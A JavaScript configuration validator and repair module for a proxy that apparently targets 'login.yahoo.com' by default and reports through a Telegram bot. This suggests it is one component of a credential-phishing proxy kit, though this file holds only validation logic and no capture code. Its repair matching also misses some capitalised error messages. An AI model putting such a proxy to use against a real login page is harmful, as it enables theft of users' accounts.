import fs from 'fs';
import path from 'path';
import validator from 'validator';
import Logger from './logger.js';

class ConfigValidator {
    constructor() {
        this.logger = new Logger();
    }

    // Validate entire configuration
    validateConfig(config) {
        const validationResults = {
            isValid: true,
            errors: []
        };

        // Validate specific sections
        this.validateProxyConfig(config.proxy, validationResults);
        this.validateTelegramConfig(config.telegram, validationResults);
        this.validateSecurityConfig(config.security, validationResults);

        return validationResults;
    }

    // Validate proxy configuration
    validateProxyConfig(proxyConfig, results) {
        if (!proxyConfig) {
            results.isValid = false;
            results.errors.push('Proxy configuration is missing');
            return;
        }

        // Validate domain
        if (!proxyConfig.target_domain || !this.isValidDomain(proxyConfig.target_domain)) {
            results.isValid = false;
            results.errors.push(`Invalid proxy target domain: ${proxyConfig.target_domain}`);
        }

        // Validate port
        if (!proxyConfig.listening_port || 
            !Number.isInteger(proxyConfig.listening_port) || 
            proxyConfig.listening_port < 1024 || 
            proxyConfig.listening_port > 65535) {
            results.isValid = false;
            results.errors.push(`Invalid listening port: ${proxyConfig.listening_port}`);
        }
    }

    // Validate Telegram configuration
    validateTelegramConfig(telegramConfig, results) {
        if (!telegramConfig) {
            results.isValid = false;
            results.errors.push('Telegram configuration is missing');
            return;
        }

        // Validate bot token
        if (!telegramConfig.bot_token || !this.isValidTelegramToken(telegramConfig.bot_token)) {
            results.isValid = false;
            results.errors.push('Invalid Telegram bot token');
        }

        // Validate allowed users
        if (!Array.isArray(telegramConfig.allowed_users)) {
            results.isValid = false;
            results.errors.push('Allowed users must be an array');
        }
    }

    // Validate security configuration
    validateSecurityConfig(securityConfig, results) {
        if (!securityConfig) {
            results.isValid = false;
            results.errors.push('Security configuration is missing');
            return;
        }

        // Validate trusted IPs
        if (!Array.isArray(securityConfig.trusted_ips)) {
            results.isValid = false;
            results.errors.push('Trusted IPs must be an array');
        } else {
            securityConfig.trusted_ips.forEach(ip => {
                if (!this.isValidIP(ip)) {
                    results.isValid = false;
                    results.errors.push(`Invalid IP: ${ip}`);
                }
            });
        }

        // Validate rate limiting
        if (!securityConfig.rate_limit) {
            results.isValid = false;
            results.errors.push('Rate limit configuration is missing');
        } else {
            const { max_requests, window_ms } = securityConfig.rate_limit;
            if (!Number.isInteger(max_requests) || max_requests <= 0) {
                results.isValid = false;
                results.errors.push(`Invalid max requests: ${max_requests}`);
            }
            if (!Number.isInteger(window_ms) || window_ms <= 0) {
                results.isValid = false;
                results.errors.push(`Invalid window ms: ${window_ms}`);
            }
        }
    }

    // Domain validation
    isValidDomain(domain) {
        return validator.isURL(`https://${domain}`, {
            require_protocol: true,
            require_valid_protocol: true
        });
    }

    // IP address validation
    isValidIP(ip) {
        return validator.isIP(ip);
    }

    // Telegram bot token validation
    isValidTelegramToken(token) {
        // Basic Telegram bot token regex
        const telegramTokenRegex = /^\d{9,10}:[a-zA-Z0-9_-]{35}$/;
        return telegramTokenRegex.test(token);
    }

    // Validate and repair configuration file
    repairConfigFile(configPath) {
        try {
            // Read existing configuration
            const rawConfig = fs.readFileSync(configPath, 'utf8');
            const config = JSON.parse(rawConfig);

            // Validate configuration
            const validationResult = this.validateConfig(config);

            // If invalid, attempt to repair
            if (!validationResult.isValid) {
                this.logger.warn('Configuration validation failed', {
                    errors: validationResult.errors
                });

                // Apply default values for invalid configurations
                const repairedConfig = this.applyDefaultValues(config, validationResult.errors);

                // Write repaired configuration
                fs.writeFileSync(
                    configPath, 
                    JSON.stringify(repairedConfig, null, 2),
                    { mode: 0o600 }
                );

                this.logger.info('Configuration repaired', { 
                    repairedErrors: validationResult.errors 
                });

                return repairedConfig;
            }

            return config;
        } catch (error) {
            this.logger.error('Configuration repair failed', { 
                error: error.message 
            });
            return null;
        }
    }

    // Apply default values for invalid configurations
    applyDefaultValues(config, errors) {
        const defaultConfig = {
            proxy: {
                target_domain: 'login.yahoo.com',
                listening_port: 8080,
                ssl_enabled: true
            },
            telegram: {
                bot_token: '',
                allowed_users: []
            },
            security: {
                trusted_ips: ['127.0.0.1'],
                rate_limit: {
                    max_requests: 100,
                    window_ms: 900000
                }
            }
        };

        // Merge default values for invalid sections
        errors.forEach(error => {
            if (error.includes('proxy')) {
                config.proxy = { ...defaultConfig.proxy, ...config.proxy };
            }
            if (error.includes('telegram')) {
                config.telegram = { ...defaultConfig.telegram, ...config.telegram };
            }
            if (error.includes('security')) {
                config.security = { ...defaultConfig.security, ...config.security };
            }
        });

        return config;
    }
}

export default new ConfigValidator();